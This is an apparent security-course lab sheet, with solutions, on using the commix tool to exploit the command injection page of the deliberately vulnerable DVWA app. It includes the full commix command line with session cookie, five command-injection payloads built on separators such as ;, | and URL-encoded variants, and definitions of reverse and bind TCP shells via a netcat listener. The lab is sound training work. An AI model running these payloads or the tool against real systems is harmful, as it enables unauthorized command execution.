# Scanning with commix
In this exercise, you'll
- Use commix to exploit DVWA
- Study new injection payloads
- Explore commix's built-in "pseudo terminal"

---

## Instructions
- Use commix to attack the command injection page.
  - Remember to specify a `--data` attribute.
  - Remember to specify a `--cookie` attribute.
  > **Solution**: The command looks like: `commix -u "http://192.168.99.100/vulnerabilities/exec/#" --data="ip=127.0.0.1&Submit=submit" --cookie="PHPSESSID=lsenpqn3k0vk7d2re6rhdbe342;security=low"`

- When commix identifies a successful payload, record it, and press `n` to proceed to the next one. Record 5 payloads before proceeding. **Note**: If you get dropped into a pseudo-shell automatically, simply type `back`.
  - **Payload 1**: ;echo FZYIQV$((55+15))$(echo FZYIQV)FZYIQV
  - **Payload 2**: `;echo DZSRFQ$((18+71))$(echo DZSRFQ)DZSRFQ`
  - **Payload 3**: `%3Becho JCDNWJ$((56+32))$(echo JCDNWJ)JCDNWJ`
  - **Payload 4**: `%26echo GTAKDM$((92+10))$(echo GTAKDM)GTAKDM`
  - **Payload 5**: `|echo GLOILL$((10+65))$(echo GLOILL)GLOILL`

- For each of the payloads above, identify which character enables the injection.
  > **Solutions**
  >  - The payloads start with `;`, which separates commands; `|`, which also allows you to run two commands on a single line; `%3B`, which is the URL-encoded version of `;`; and `%26`, the percent-encoded version of `&`, which you'll study soon.

- Proceed to the next payload, and press `Y` when prompted to enter a pseudo-terminal.

- Press `?` to list available options. Work with a partner to research the last two options. Record definitions for each below.
  - **reverse_tcp**: A reverse TCP connection is a connection from the target/victim _back_ to a listening port on the attacking machine.
  - **bind_tcp**: A bind TCP connection is a connection from the attacking machine _to_ a listening port on the victim machine.


- Refer to the documentation at: <https://github.com/commixproject/commix/wiki/Reverse-Shells>

- What does the reverse tcp handler allow you to do?

  > **Solution**: The reverse TCP handler allows you to open a connection back to a netcat listener on your attacking machine. This, in turn, lets you transfer arbitrary data to writable directories on the target. Score.
